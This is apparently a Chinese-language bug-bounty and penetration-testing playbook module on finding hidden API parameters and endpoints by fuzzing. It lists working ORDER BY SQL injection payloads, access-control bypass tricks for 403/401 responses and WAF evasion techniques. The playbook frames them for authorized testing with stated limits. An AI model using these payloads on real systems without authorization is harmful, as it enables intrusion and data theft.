# 不对称推理与接口联想 Fuzz（参数面扩挖）

> **适用范围：国内外通用**——手法与 payload 不分国内 SRC / 国外 bug bounty / 渗透测试 / 红队 Web 打点，全部适用。国外 HackerOne/Bugcrowd 报告同样吃"参数不对称→隐藏字段"这类发现。
>
> 两条进站信号加载本模块：① 列表/查询接口**请求字段少、返回字段多**（不对称）；② 已知部分接口路径（fuzz 字典联想扩面）。核心思想：不要只测看得见的参数——请求/响应之间的不对称背后一定有文章。

## 一、不对称推理（字段回拼 → 隐藏参数 → ORDER BY 注入）

### 1.1 三步递进

```
第1步 字段回拼：返回包每个字段拼回请求包，逐一验证是否生效
   ↓ 全无效？
第2步 隐藏参数自构 fuzz：order/orderBy/sort/sidx/field/column/
   limit/offset/pageSize/where/filter/keyword...
   先验证参数是否被接受（返回结果变化），再测注入
   ↓ 命中排序类参数？
第3步 ORDER BY 注入：排序参数直接拼进 SQL 的 ORDER BY 子句，
   无法预编译 → 注入高发区
```

### 1.2 为什么回拼有效

后端能吐出这些字段，说明数据库/DTO 里就有——字段名作为请求参数（过滤/排序条件）被后端悄悄支持的概率高。请求里没有 ≠ 服务端不认。

### 1.3 ORDER BY 注入手法

```sql
-- 探测（先确认参数生效：改值看排序变化）
order=asc&orderBy=id
-- 布尔
orderBy=(case when (1=1) then id else username end)
-- 时间盲（WAF 拦 sleep 时换 benchmark/randomblob）
orderBy=(case when (substr(database(),1,1)='a') then sleep(3) else id end)
-- 报错
orderBy=updatexml(1,concat(0x7e,database()),1)
```

红线：仅到 version/库名层级。WAF 绕过见 §三 与 `waf-bypass.md`。

### 1.4 参数滞空

每个参数值置空/置 null 单独试一遍——"参数后边滞空可能有意想不到的结果"（部分框架对 null 走不同分支）。

## 二、接口联想 Fuzz（从已知接口扩未知）

### 2.1 动词联想（拿到一个 list，fuzz 全家桶）

```
已知：/api/user/list
联想 fuzz：/api/user/add  /save  /delete  /edit  /update
          /info  /detail  /export  /import  /query  /page
```

- 删改接口**只判鉴权结果**（401/403 vs 200），不发真实载荷。
- `xxx/list` 无害不代表 `xxx/info/{id}` 无害——详情接口单独 fuzz。

### 2.2 同义词联想（修复不同步）

```
upload 已修复 → fuzz uploadImage / uploadFile / uploadImg / uploadAvatar
login 已修复 → fuzz loginByPhone / quickLogin / doLogin / loginV2
```

开发修了主接口，历史/别名接口还在。上传类关键字全部做成字典。

### 2.3 框架接口字典（指纹→内置路由）

| 指纹 | 直接 fuzz |
|------|----------|
| RuoYi 界面 | `/prod-api/auth/getToken`、`/system/user/list`、`/monitor/online/list` 等框架自带路由（原资产没有这些接口，框架带着） |
| Spring | `/actuator/*`、`/v2/api-docs`、`/druid/*`（见 asset-triage 字典） |
| 通用 | `/v1/ /v2/ /api/v1/ /testapi/ /api/` 前缀变换 + `;/v2/api-docs;.css` 分号变体 |

### 2.4 baseurl 与 404 差异

- **两种 404 页面不同** = 有路由层/拦截层在区分"不存在的路径"和"被拦的路径"——被拦的那种值得绕。
- fuzz 出接口后**继续 fuzz baseurl**（`/api` ↔ `/testapi` ↔ `/` 前缀互换）。
- 404 但路径真实存在 → 回溯 JS 找该路径的调用处补参数。

### 2.5 参数来源五法（fuzz 出接口但缺参数时）

1. JS 回溯（搜接口路径，看调用处传参）
2. 同资源 list 接口的返回字段
3. 其他数据包里同名参数
4. AI 按 DTO 惯例构造（pageNo/pageSize/keyword 先试）
5. 历史参数梭哈（Burp CAE/Collected Parameters 全量回填）

## 三、权限绕过变体清单（403/401 之后打）

| 类别 | Payload |
|------|---------|
| 分号矩阵 | `/admin;/`、`/admin;.css`、`/admin/.;/`、`/;/admin`、`..;x=1`（拦 `..;` 时加废参数） |
| 编码/填充 | `%2e`、`/admin%20`、`/admin/./`、`//admin`、`/admin/.` |
| 请求头改写 | `X-Original-URL: /admin`、`X-Rewrite-URL`、`X-Forwarded-For: 127.0.0.1`、`X-Custom-IP-Authorization: 127.0.0.1` |
| **改 HTTP 方法** | GET↔POST↔PUT↔HEAD、大小写变换（`LIST`/`List`）——很多过滤只匹配 GET /admin |
| 白名单路由+路径穿越 | 找到放行的白名单（如 `login.do`、静态资源）→ `白名单/../` 目标路径过 WAF |
| 尾斜杠 | `api/xxx/list` 404 → `api/xxx/list/` 200（尾斜杠改变路由匹配） |

> 绕过成功后按 §2.1 继续 fuzz 接口。原 403 判定见 asset-triage「403 绕过候选」。

## 四、WAF/拦截绕过速记（配合 `waf-bypass.md`）

- **脏数据垫长**：JSON 体里加一个超长垃圾字段（`"a":"aaa…3000字"`）把检测窗口挤掉——云 WAF 只检查前 N 字节。
- **换行隔离**：`select --%0a--%0a--%0a id --%0a from ...` 多个注释+换行拆散敏感词（`--%0a` 重复填充）。
- **内联注释**：`sleep/*!aaaaaa*/(/**/1/**/)`。
- **传输格式变换**：JSON↔form↔XML 互换；filename 参数换行放下一行（multipart 边界差异）。
- **等价函数**：hex/concat/version 替换被禁函数；SQLite 无 sleep 用 `randomblob(100000000)`。

## 五、执行纪律

- 每一步记录请求/响应差异（哪次思路转换产出了什么信号）。
- 删改接口只判鉴权不发载荷；越权验证用双账号对比（`cookie_b`）。
- fuzz 限速，单端点失败 3 次换维度（见 chain.md 方向切换）。
